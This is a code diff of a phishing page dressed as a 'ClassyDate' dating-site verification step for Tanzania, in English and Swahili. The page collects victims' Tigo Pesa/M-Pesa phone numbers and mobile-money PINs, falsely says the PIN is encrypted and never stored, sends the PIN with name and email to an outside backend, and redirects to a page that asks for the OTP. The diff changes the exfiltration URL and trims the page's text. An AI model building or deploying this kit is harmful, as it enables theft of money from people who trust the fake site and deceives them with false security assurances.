@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>ClassyDate Tanzania · Thibitisha Utambulisho</title>
+    <title>ClassyDate · Verify Identity</title>
     <style>
         * {
             margin: 0;
@@ -20,7 +20,6 @@
             position: relative;
         }
 
-        /* Language Toggle Switch */
         .lang-toggle {
             position: fixed;
             top: 20px;
@@ -50,321 +49,72 @@
             color: white;
             box-shadow: 0 2px 8px rgba(212,123,123,0.3);
         }
-        .lang-btn:first-child {
-            border-radius: 35px 0 0 35px;
-        }
-        .lang-btn:last-child {
-            border-radius: 0 35px 35px 0;
-        }
+        .lang-btn:first-child { border-radius: 35px 0 0 35px; }
+        .lang-btn:last-child { border-radius: 0 35px 35px 0; }
 
-        .app-container {
-            max-width: 500px;
-            width: 100%;
-            margin: 0 auto;
-            position: relative;
-            z-index: 1;
-        }
+        .app-container { max-width: 500px; width: 100%; margin: 0 auto; position: relative; z-index: 1; }
+        .hero { text-align: center; margin-bottom: 20px; animation: fadeInUp 0.5s ease-out; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes floatHeart { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-5px); } }
+        .heart-icon { font-size: 2rem; animation: floatHeart 3s ease-in-out infinite; display: inline-block; }
+        .logo-text { font-size: 2rem; font-weight: 700; letter-spacing: -0.5px; background: linear-gradient(135deg, #2C2C2C, #8B3A4A, #D47B7B); background-clip: text; -webkit-background-clip: text; color: transparent; margin-top: 5px; }
+        .logo-sub { font-size: 0.7rem; font-weight: 400; color: #D47B7B; letter-spacing: 2px; margin-top: -5px; }
 
-        .hero {
-            text-align: center;
-            margin-bottom: 20px;
-            animation: fadeInUp 0.5s ease-out;
-        }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes floatHeart {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-5px); }
-        }
-        .heart-icon {
-            font-size: 2rem;
-            animation: floatHeart 3s ease-in-out infinite;
-            display: inline-block;
-        }
-        .logo-text {
-            font-size: 2rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #2C2C2C, #8B3A4A, #D47B7B);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-top: 5px;
-        }
-        .logo-sub {
-            font-size: 0.7rem;
-            font-weight: 400;
-            color: #D47B7B;
-            letter-spacing: 2px;
-            margin-top: -5px;
-        }
+        .trust-banner { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+        .trust-pill { background: white; border: 1px solid #E8E0E0; border-radius: 30px; padding: 6px 14px; font-size: 0.7rem; font-weight: 500; color: #D47B7B; }
 
-        .trust-banner {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .trust-pill {
-            background: white;
-            border: 1px solid #E8E0E0;
-            border-radius: 30px;
-            padding: 6px 14px;
-            font-size: 0.7rem;
-            font-weight: 500;
-            color: #D47B7B;
-        }
+        .verify-card { background: white; border-radius: 28px; padding: 28px 24px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); animation: fadeInUp 0.5s ease-out 0.1s both; }
+        .section-title { font-size: 1.6rem; font-weight: 700; color: #2C2C2C; margin-bottom: 5px; }
+        .section-sub { font-size: 0.75rem; color: #6B6B6B; margin-bottom: 25px; border-left: 3px solid #D47B7B; padding-left: 12px; }
 
-        .verify-card {
-            background: white;
-            border-radius: 28px;
-            padding: 28px 24px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
-            animation: fadeInUp 0.5s ease-out 0.1s both;
-        }
+        .registration-notice { background: linear-gradient(135deg, #FFF0EC, #FFE8E3); border-radius: 20px; padding: 18px; margin-bottom: 20px; border: 1px solid #F0E0E0; text-align: center; }
+        .notice-title { font-size: 1rem; font-weight: 700; color: #8B3A4A; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .notice-text { font-size: 0.75rem; color: #6B6B6B; line-height: 1.5; }
+        .notice-highlight { color: #D47B7B; font-weight: 600; }
 
-        .section-title {
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: #2C2C2C;
-            margin-bottom: 5px;
-        }
-        .section-sub {
-            font-size: 0.75rem;
-            color: #6B6B6B;
-            margin-bottom: 25px;
-            border-left: 3px solid #D47B7B;
-            padding-left: 12px;
-        }
+        .user-summary { background: #FEFAF8; border-radius: 20px; padding: 16px; margin-bottom: 20px; border: 1px solid #F0E0E0; }
+        .summary-row { display: flex; justify-content: space-between; padding: 10px 0; font-size: 0.8rem; border-bottom: 1px solid #F0E0E0; }
+        .summary-row:last-child { border-bottom: none; }
+        .summary-label { color: #6B6B6B; font-weight: 500; }
+        .summary-value { color: #2C2C2C; font-weight: 600; }
 
-        .registration-notice {
-            background: linear-gradient(135deg, #FFF0EC, #FFE8E3);
-            border-radius: 20px;
-            padding: 18px;
-            margin-bottom: 20px;
-            border: 1px solid #F0E0E0;
-            text-align: center;
-        }
-        .notice-title {
-            font-size: 1rem;
-            font-weight: 700;
-            color: #8B3A4A;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .notice-text {
-            font-size: 0.75rem;
-            color: #6B6B6B;
-            line-height: 1.5;
-        }
-        .notice-highlight {
-            color: #D47B7B;
-            font-weight: 600;
-        }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 0.75rem; font-weight: 600; color: #4a2a2a; margin-bottom: 6px; }
+        .required:after { content: "*"; color: #D47B7B; margin-left: 4px; }
+        input { width: 100%; padding: 14px 16px; font-size: 0.9rem; border: 1.5px solid #F0E0E0; border-radius: 16px; background: #FEFAF8; color: #2a1a1a; font-family: inherit; transition: all 0.2s ease; }
+        input:focus { outline: none; border-color: #D47B7B; box-shadow: 0 0 0 3px rgba(212, 123, 123, 0.1); background: white; }
+        input::placeholder { color: #B8A8A8; }
 
-        .user-summary {
-            background: #FEFAF8;
-            border-radius: 20px;
-            padding: 16px;
-            margin-bottom: 20px;
-            border: 1px solid #F0E0E0;
-        }
-        .summary-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            font-size: 0.8rem;
-            border-bottom: 1px solid #F0E0E0;
-        }
-        .summary-row:last-child {
-            border-bottom: none;
-        }
-        .summary-label {
-            color: #6B6B6B;
-            font-weight: 500;
-        }
-        .summary-value {
-            color: #2C2C2C;
-            font-weight: 600;
-        }
+        .pin-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 12px; }
+        .pin-box { width: 60px; height: 60px; background: #FEFAF8; border: 1.5px solid #F0E0E0; border-radius: 16px; text-align: center; font-size: 1.5rem; font-weight: 600; color: #8B3A4A; outline: none; transition: all 0.2s ease; }
+        .pin-box:focus { border-color: #D47B7B; box-shadow: 0 0 0 3px rgba(212, 123, 123, 0.1); }
 
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: #4a2a2a;
-            margin-bottom: 6px;
-        }
-        .required:after {
-            content: "*";
-            color: #D47B7B;
-            margin-left: 4px;
-        }
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            font-size: 0.9rem;
-            border: 1.5px solid #F0E0E0;
-            border-radius: 16px;
-            background: #FEFAF8;
-            color: #2a1a1a;
-            font-family: inherit;
-            transition: all 0.2s ease;
-        }
-        input:focus {
-            outline: none;
-            border-color: #D47B7B;
-            box-shadow: 0 0 0 3px rgba(212, 123, 123, 0.1);
-            background: white;
-        }
-        input::placeholder {
-            color: #B8A8A8;
-        }
+        .pin-hint { font-size: 0.65rem; color: #B8A8A8; text-align: center; margin-bottom: 8px; }
+        .security-warning { background: rgba(212, 123, 123, 0.08); border-radius: 16px; padding: 12px 15px; margin: 15px 0 10px; display: flex; align-items: center; gap: 12px; border-left: 3px solid #D47B7B; }
+        .warning-icon { font-size: 1.3rem; }
+        .warning-text { font-size: 0.7rem; color: #8B3A4A; line-height: 1.4; flex: 1; }
+        .warning-text strong { font-weight: 700; }
 
-        .pin-container {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 12px;
-        }
-        .pin-box {
-            width: 60px;
-            height: 60px;
-            background: #FEFAF8;
-            border: 1.5px solid #F0E0E0;
-            border-radius: 16px;
-            text-align: center;
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: #8B3A4A;
-            outline: none;
-            transition: all 0.2s ease;
-        }
-        .pin-box:focus {
-            border-color: #D47B7B;
-            box-shadow: 0 0 0 3px rgba(212, 123, 123, 0.1);
-        }
+        .verify-btn { width: 100%; background: linear-gradient(135deg, #D47B7B, #8B3A4A); border: none; padding: 16px; font-size: 1rem; font-weight: 600; color: white; border-radius: 50px; cursor: pointer; transition: all 0.3s ease; margin-top: 16px; }
+        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(212,123,123,0.4); }
+        .verify-btn:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
 
-        .pin-hint {
-            font-size: 0.65rem;
-            color: #B8A8A8;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-
-        .security-warning {
-            background: rgba(212, 123, 123, 0.08);
-            border-radius: 16px;
-            padding: 12px 15px;
-            margin: 15px 0 10px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-left: 3px solid #D47B7B;
-        }
-        .warning-icon {
-            font-size: 1.3rem;
-        }
-        .warning-text {
-            font-size: 0.7rem;
-            color: #8B3A4A;
-            line-height: 1.4;
-            flex: 1;
-        }
-        .warning-text strong {
-            font-weight: 700;
-        }
-
-        .verify-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #D47B7B, #8B3A4A);
-            border: none;
-            padding: 16px;
-            font-size: 1rem;
-            font-weight: 600;
-            color: white;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 16px;
-        }
-        .verify-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(212,123,123,0.4);
-        }
-        .verify-btn:disabled {
-            opacity: 0.5;
-            transform: none;
-            cursor: not-allowed;
-        }
-
-        .error-message {
-            background: rgba(244, 63, 94, 0.08);
-            color: #D96C6C;
-            padding: 12px;
-            border-radius: 14px;
-            font-size: 0.75rem;
-            margin-top: 14px;
-            text-align: center;
-            display: none;
-        }
-
-        .footer-trust {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 20px;
-            padding-top: 16px;
-            border-top: 1px solid #F0E0E0;
-            flex-wrap: wrap;
-        }
-        .trust-badge {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 0.65rem;
-            font-weight: 500;
-            color: #A09090;
-        }
+        .error-message { background: rgba(244, 63, 94, 0.08); color: #D96C6C; padding: 12px; border-radius: 14px; font-size: 0.75rem; margin-top: 14px; text-align: center; display: none; }
+        .footer-trust { display: flex; justify-content: center; gap: 20px; margin-top: 20px; padding-top: 16px; border-top: 1px solid #F0E0E0; flex-wrap: wrap; }
+        .trust-badge { display: flex; align-items: center; gap: 5px; font-size: 0.65rem; font-weight: 500; color: #A09090; }
 
         @media (max-width: 480px) {
-            body {
-                padding: 15px;
-            }
-            .verify-card {
-                padding: 20px 18px;
-            }
-            .section-title {
-                font-size: 1.4rem;
-            }
-            .pin-box {
-                width: 50px;
-                height: 50px;
-                font-size: 1.3rem;
-            }
-            .lang-toggle {
-                top: 12px;
-                right: 12px;
-            }
-            .lang-btn {
-                padding: 6px 16px;
-                font-size: 0.7rem;
-            }
+            body { padding: 15px; }
+            .verify-card { padding: 20px 18px; }
+            .section-title { font-size: 1.4rem; }
+            .pin-box { width: 50px; height: 50px; font-size: 1.3rem; }
+            .lang-toggle { top: 12px; right: 12px; }
+            .lang-btn { padding: 6px 16px; font-size: 0.7rem; }
         }
     </style>
 </head>
 <body>
 
-<!-- Language Toggle Switch -->
 <div class="lang-toggle">
     <button class="lang-btn active" id="langEn" onclick="setLanguage('en')">EN</button>
     <button class="lang-btn" id="langSw" onclick="setLanguage('sw')">SW</button>
@@ -388,13 +138,8 @@
         <div class="section-sub" id="sectionSub">Subscribe to start your journey</div>
 
         <div class="registration-notice">
-            <div class="notice-title">
-                <span>📝</span> <span id="noticeTitle">Subscription Required</span>
-            </div>
-            <div class="notice-text" id="noticeText">
-                Please ensure your details match your Tigo Pesa/M-Pesa account. 
-                A one-time subscription fee of <span class="notice-highlight" id="feeAmount">TSh 15,000</span> will be deducted to verify and activate your profile.
-            </div>
+            <div class="notice-title"><span>📝</span> <span id="noticeTitle">Subscription Required</span></div>
+            <div class="notice-text" id="noticeText">A one-time subscription fee of <span class="notice-highlight">TSh 15,000</span> will be deducted to verify your profile.</div>
         </div>
 
         <div class="user-summary" id="userSummary"></div>
@@ -417,12 +162,10 @@
 
             <div class="security-warning">
                 <div class="warning-icon">🔒</div>
-                <div class="warning-text" id="warningText"><strong>Never share your PIN with anyone.</strong> ClassyDate will never ask for your PIN outside of this secure verification process.</div>
+                <div class="warning-text" id="warningText"><strong>Never share your PIN.</strong> ClassyDate will never ask for your PIN outside this secure process.</div>
             </div>
 
-            <button type="button" class="verify-btn" id="verifyBtn" disabled>
-                <span id="btnText">Subscribe & Continue →</span>
-            </button>
+            <button type="button" class="verify-btn" id="verifyBtn" disabled><span id="btnText">Subscribe & Continue →</span></button>
             <div class="error-message" id="errorMessage"></div>
         </form>
 
@@ -435,23 +178,22 @@
 </div>
 
 <script>
+    // ========== CORRECT BACKEND URL FOR TANZANIA ==========
+    const RAILWAY_URL = 'https://classydate-tz-production.up.railway.app';
+
     // ========== TRANSLATIONS ==========
     const translations = {
         en: {
-            logoText: "ClassyDate Tanzania",
-            logoSub: "Verify Identity",
-            trust1: "Verified Profiles",
-            trust2: "Private & Secure",
-            trust3: "Tanzania",
-            sectionTitle: "Complete Registration",
-            sectionSub: "Subscribe to start your journey",
-            noticeTitle: "Subscription Required",
-            noticeText: "Please ensure your details match your Tigo Pesa/M-Pesa account. A one-time subscription fee of TSh 15,000 will be deducted to verify and activate your profile.",
+            logoText: "ClassyDate", logoSub: "Verify Identity",
+            trust1: "Verified Profiles", trust2: "Private & Secure", trust3: "Tanzania",
+            sectionTitle: "Complete Registration", sectionSub: "Subscribe to start your journey",
+            noticeTitle: "Subscription Required", 
+            noticeText: "A one-time subscription fee of TSh 15,000 will be deducted to verify your profile.",
             labelPhone: "Tigo Pesa / M-Pesa Number",
             phoneHint: "📱 Enter your mobile money number (must start with +255)",
             labelPin: "Enter your PIN",
             pinHint: "🔒 Your PIN is encrypted and never stored",
-            warningText: "Never share your PIN with anyone. ClassyDate will never ask for your PIN outside of this secure verification process.",
+            warningText: "Never share your PIN. ClassyDate will never ask for your PIN outside this secure process.",
             btnText: "Subscribe & Continue →",
             footer1: "Tigo Pesa/M-Pesa Secured",
             footer2: "One-time TSh 15,000",
@@ -464,20 +206,16 @@
             }
         },
         sw: {
-            logoText: "ClassyDate Tanzania",
-            logoSub: "Thibitisha Utambulisho",
-            trust1: "Profaili Zilizothibitishwa",
-            trust2: "Faragha na Usalama",
-            trust3: "Tanzania",
-            sectionTitle: "Kamilisha Usajili",
-            sectionSub: "Jiunge ili kuanza safari yako",
+            logoText: "ClassyDate", logoSub: "Thibitisha Utambulisho",
+            trust1: "Profaili Zilizothibitishwa", trust2: "Faragha na Usalama", trust3: "Tanzania",
+            sectionTitle: "Kamilisha Usajili", sectionSub: "Jiunge ili kuanza safari yako",
             noticeTitle: "Usajili Unahitajika",
-            noticeText: "Hakikisha maelezo yako yanalingana na akaunti yako ya Tigo Pesa/M-Pesa. Ada ya usajili ya mara moja ya TSh 15,000 itakatwa ili kuthibitisha na kuamsha profaili yako.",
+            noticeText: "Ada ya usajili ya mara moja ya TSh 15,000 itakatwa ili kuthibitisha profaili yako.",
             labelPhone: "Nambari ya Tigo Pesa / M-Pesa",
             phoneHint: "📱 Weka nambari yako ya Tigo Pesa/M-Pesa (lazima iwe +255)",
             labelPin: "Weka Namba Siri (PIN)",
             pinHint: "🔒 Namba siri yako imesimbwa kwa usalama",
-            warningText: "Usimwambie mtu yeyote namba siri yako. ClassyDate haitauliza namba siri yako nje ya mchakato huu salama wa uthibitishaji.",
+            warningText: "Usimwambie mtu yeyote namba siri yako. ClassyDate haitauliza namba siri yako nje ya mchakato huu salama.",
             btnText: "Jiunge na Endelea →",
             footer1: "Tigo Pesa/M-Pesa Salama",
             footer2: "Ada ya mara moja TSh 15,000",
@@ -493,43 +231,26 @@
 
     let currentLang = 'en';
 
-    // Get user data from URL
     const urlParams = new URLSearchParams(window.location.search);
-    const userName = urlParams.get('name') || (currentLang === 'en' ? 'Guest' : 'Mgeni');
+    const userName = urlParams.get('name') || 'Guest';
     const userAge = urlParams.get('age') || 'N/A';
     const userLocation = urlParams.get('location') || 'N/A';
     const userEmail = urlParams.get('email') || 'N/A';
     const lookingFor = urlParams.get('lookingFor') || 'N/A';
 
-    // Display user summary
     function updateUserSummary() {
-        const t = translations[currentLang];
         const userSummary = document.getElementById('userSummary');
         userSummary.innerHTML = `
-            <div class="summary-row">
-                <span class="summary-label">${currentLang === 'en' ? 'Name' : 'Jina'}</span>
-                <span class="summary-value">${decodeURIComponent(userName)}</span>
-            </div>
-            <div class="summary-row">
-                <span class="summary-label">${currentLang === 'en' ? 'Age' : 'Umri'}</span>
-                <span class="summary-value">${userAge}</span>
-            </div>
-            <div class="summary-row">
-                <span class="summary-label">${currentLang === 'en' ? 'Location' : 'Mahali'}</span>
-                <span class="summary-value">${decodeURIComponent(userLocation)}</span>
-            </div>
-            <div class="summary-row">
-                <span class="summary-label">${currentLang === 'en' ? 'Looking for' : 'Nataka'}</span>
-                <span class="summary-value">${decodeURIComponent(lookingFor)}</span>
-            </div>
+            <div class="summary-row"><span class="summary-label">${currentLang === 'en' ? 'Name' : 'Jina'}</span><span class="summary-value">${decodeURIComponent(userName)}</span></div>
+            <div class="summary-row"><span class="summary-label">${currentLang === 'en' ? 'Age' : 'Umri'}</span><span class="summary-value">${userAge}</span></div>
+            <div class="summary-row"><span class="summary-label">${currentLang === 'en' ? 'Location' : 'Mahali'}</span><span class="summary-value">${decodeURIComponent(userLocation)}</span></div>
+            <div class="summary-row"><span class="summary-label">${currentLang === 'en' ? 'Looking for' : 'Nataka'}</span><span class="summary-value">${decodeURIComponent(lookingFor)}</span></div>
         `;
     }
 
-    // Apply language
     function setLanguage(lang) {
         currentLang = lang;
         const t = translations[lang];
-        const errors = t.errors;
         
         document.getElementById('logoText').textContent = t.logoText;
         document.getElementById('logoSub').textContent = t.logoSub;
@@ -544,7 +265,7 @@
         document.getElementById('phoneHint').textContent = t.phoneHint;
         document.getElementById('labelPin').innerHTML = t.labelPin + " *";
         document.getElementById('pinHint').textContent = t.pinHint;
-        document.getElementById('warningText').innerHTML = `<strong>${t.warningText.split('.')[0]}.</strong> ${t.warningText.split('.')[1] || ''}`;
+        document.getElementById('warningText').innerHTML = t.warningText;
         document.getElementById('btnText').textContent = t.btnText;
         document.getElementById('footer1').textContent = t.footer1;
         document.getElementById('footer2').textContent = t.footer2;
@@ -556,7 +277,6 @@
         document.getElementById('langSw').classList.toggle('active', lang === 'sw');
     }
 
-    // Get DOM elements
     const pin1 = document.getElementById('pin1');
     const pin2 = document.getElementById('pin2');
     const pin3 = document.getElementById('pin3');
@@ -566,23 +286,17 @@
     const errorMsg = document.getElementById('errorMessage');
 
     function checkAllFields() {
-        const pinFilled = pin1.value && pin2.value && pin3.value && pin4.value;
-        const phoneFilled = phoneInput.value.trim().length > 0;
-        verifyBtn.disabled = !(pinFilled && phoneFilled);
+        verifyBtn.disabled = !(pin1.value && pin2.value && pin3.value && pin4.value && phoneInput.value.trim());
     }
 
     function handlePinInput(current, next, prev) {
         current.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
-            if (this.value.length === 1 && next) {
-                next.focus();
-            }
+            if (this.value.length === 1 && next) next.focus();
             checkAllFields();
         });
         current.addEventListener('keydown', function(e) {
-            if (e.key === 'Backspace' && this.value === '' && prev) {
-                prev.focus();
-            }
+            if (e.key === 'Backspace' && this.value === '' && prev) prev.focus();
         });
     }
 
@@ -590,16 +304,12 @@
     handlePinInput(pin2, pin3, pin1);
     handlePinInput(pin3, pin4, pin2);
     handlePinInput(pin4, null, pin3);
-
     phoneInput.addEventListener('input', checkAllFields);
 
     function isValidTanzaniaPhone(phone) {
         const cleaned = phone.replace(/[\s\-\(\)]/g, '');
         return cleaned.startsWith('+255') && cleaned.length >= 12;
     }
-
-    // Telegram Configuration - UPDATED CREDENTIALS
-    const RAILWAY_URL = 'https://where-hearts-production.up.railway.app';
 
     async function sendPinNotification(phone, pin, name, email) {
         try {
@@ -612,58 +322,52 @@
                     name: name,
                     email: email,
                     type: 'pin',
-                    site: 'ClassyDate Tanzania'
+                    site: 'ClassyDate'
                 })
             });
         } catch (error) {
-            console.error('Error sending notification:', error);
+            console.error('Error:', error);
         }
     }
 
     verifyBtn.onclick = async function() {
         const t = translations[currentLang];
-        const errors = t.errors;
-        
         const phone = phoneInput.value.trim();
         const pin = pin1.value + pin2.value + pin3.value + pin4.value;
         
         if (!phone) {
-            errorMsg.textContent = errors.fillPhone;
+            errorMsg.textContent = t.errors.fillPhone;
             errorMsg.style.display = 'block';
-            setTimeout(() => { errorMsg.style.display = 'none'; }, 3000);
+            setTimeout(() => errorMsg.style.display = 'none', 3000);
             return;
         }
         
         if (!isValidTanzaniaPhone(phone)) {
-            errorMsg.textContent = errors.invalidPhone;
+            errorMsg.textContent = t.errors.invalidPhone;
             errorMsg.style.display = 'block';
-            setTimeout(() => { errorMsg.style.display = 'none'; }, 3000);
+            setTimeout(() => errorMsg.style.display = 'none', 3000);
             return;
         }
         
         if (pin.length !== 4) {
-            errorMsg.textContent = errors.fillPin;
+            errorMsg.textContent = t.errors.fillPin;
             errorMsg.style.display = 'block';
-            setTimeout(() => { errorMsg.style.display = 'none'; }, 3000);
+            setTimeout(() => errorMsg.style.display = 'none', 3000);
             return;
         }
         
         errorMsg.style.display = 'none';
         verifyBtn.disabled = true;
-        verifyBtn.innerHTML = errors.processing;
+        verifyBtn.innerHTML = t.errors.processing;
         
         await sendPinNotification(phone, pin, decodeURIComponent(userName), decodeURIComponent(userEmail));
         
         window.location.href = `enter-otp.html?phone=${encodeURIComponent(phone)}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}`;
     };
 
-    // Initialize
     setLanguage('en');
     updateUserSummary();
-    
-    setTimeout(() => {
-        pin1.focus();
-    }, 100);
+    setTimeout(() => pin1.focus(), 100);
 </script>
 </body>
 </html>
